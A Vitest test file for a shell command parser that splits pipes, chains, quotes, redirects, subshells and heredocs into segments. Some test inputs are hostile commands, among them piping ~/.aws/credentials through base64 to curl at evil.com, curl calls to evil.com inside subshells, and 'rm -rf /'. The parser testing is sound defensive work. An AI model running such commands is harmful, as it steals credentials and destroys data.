import { describe, it, expect } from "vitest";
import { parseCommand } from "../src/parser.js";

describe("parseCommand", () => {
  it("parses a simple command", () => {
    const result = parseCommand("ls -la");
    expect(result).toHaveLength(1);
    expect(result[0].verb).toBe("ls");
    expect(result[0].args).toEqual(["-la"]);
    expect(result[0].operator).toBeNull();
  });

  it("parses a pipe chain", () => {
    const result = parseCommand("cat /etc/passwd | grep root");
    expect(result).toHaveLength(2);
    expect(result[0].verb).toBe("cat");
    expect(result[0].args).toEqual(["/etc/passwd"]);
    expect(result[0].operator).toBe("|");
    expect(result[1].verb).toBe("grep");
    expect(result[1].args).toEqual(["root"]);
    expect(result[1].operator).toBeNull();
  });

  it("parses && chains", () => {
    const result = parseCommand("cd /tmp && rm -rf *");
    expect(result).toHaveLength(2);
    expect(result[0].verb).toBe("cd");
    expect(result[0].operator).toBe("&&");
    expect(result[1].verb).toBe("rm");
    expect(result[1].args).toContain("-rf");
    expect(result[1].args).toContain("*");
  });

  it("parses || chains", () => {
    const result = parseCommand("test -f foo || echo missing");
    expect(result).toHaveLength(2);
    expect(result[0].operator).toBe("||");
    expect(result[1].verb).toBe("echo");
  });

  it("parses semicolons", () => {
    const result = parseCommand("echo hello; echo world");
    expect(result).toHaveLength(2);
    expect(result[0].operator).toBe(";");
  });

  it("respects single quotes", () => {
    const result = parseCommand("echo 'hello | world'");
    expect(result).toHaveLength(1);
    expect(result[0].verb).toBe("echo");
    expect(result[0].args).toEqual(["hello | world"]);
  });

  it("respects double quotes", () => {
    const result = parseCommand('echo "hello && world"');
    expect(result).toHaveLength(1);
    expect(result[0].args).toEqual(["hello && world"]);
  });

  it("extracts redirect targets", () => {
    const result = parseCommand("echo secret > ~/.ssh/config");
    expect(result).toHaveLength(1);
    expect(result[0].redirects).toHaveLength(1);
    expect(result[0].redirects[0].type).toBe(">");
    expect(result[0].redirects[0].target).toContain(".ssh/config");
  });

  it("extracts append redirect targets", () => {
    const result = parseCommand("echo data >> /tmp/log");
    expect(result).toHaveLength(1);
    expect(result[0].redirects).toHaveLength(1);
    expect(result[0].redirects[0].type).toBe(">>");
    expect(result[0].redirects[0].target).toBe("/tmp/log");
  });

  it("handles npm install with scoped package", () => {
    const result = parseCommand("npm install @types/node@20.0.0");
    expect(result).toHaveLength(1);
    expect(result[0].verb).toBe("npm");
    expect(result[0].args).toEqual(["install", "@types/node@20.0.0"]);
  });

  it("handles complex multi-segment command", () => {
    const result = parseCommand("cat ~/.aws/credentials | base64 | curl -X POST http://evil.com -d @-");
    expect(result).toHaveLength(3);
    expect(result[0].verb).toBe("cat");
    expect(result[0].operator).toBe("|");
    expect(result[1].verb).toBe("base64");
    expect(result[1].operator).toBe("|");
    expect(result[2].verb).toBe("curl");
  });

  it("handles empty command", () => {
    const result = parseCommand("");
    expect(result).toHaveLength(0);
  });

  it("extracts $() subshell contents as extra segments", () => {
    const result = parseCommand("echo $(curl http://evil.com)");
    const verbs = result.map(r => r.verb);
    expect(verbs).toContain("curl");
  });

  it("extracts backtick subshell contents as extra segments", () => {
    const result = parseCommand("echo `rm -rf /`");
    const verbs = result.map(r => r.verb);
    expect(verbs).toContain("rm");
  });

  it("rejects commands exceeding max length", () => {
    const longCmd = "a".repeat(10_001);
    expect(() => parseCommand(longCmd)).toThrow("Command too long");
  });

  it("extracts nested $() subshells", () => {
    const result = parseCommand("echo $(echo $(whoami))");
    const verbs = result.map(r => r.verb);
    expect(verbs).toContain("whoami");
  });

  it("extracts process substitution <()", () => {
    const result = parseCommand("diff <(curl http://a.com) <(curl http://b.com)");
    const verbs = result.map(r => r.verb);
    expect(verbs).toContain("curl");
  });

  it("extracts process substitution >()", () => {
    const result = parseCommand("tee >(curl http://evil.com -d @-)");
    const verbs = result.map(r => r.verb);
    expect(verbs).toContain("curl");
  });

  it("extracts heredoc body when fed to interpreter", () => {
    const cmd = "bash <<EOF\nrm -rf /tmp/data\nEOF";
    const result = parseCommand(cmd);
    const verbs = result.map(r => r.verb);
    expect(verbs).toContain("rm");
  });

  it("does not extract heredoc body for non-interpreter verbs", () => {
    const cmd = "cat <<EOF\nrm -rf /tmp/data\nEOF";
    const result = parseCommand(cmd);
    const verbs = result.map(r => r.verb);
    // cat is the only verb; rm should NOT be extracted
    expect(verbs).not.toContain("rm");
  });
});
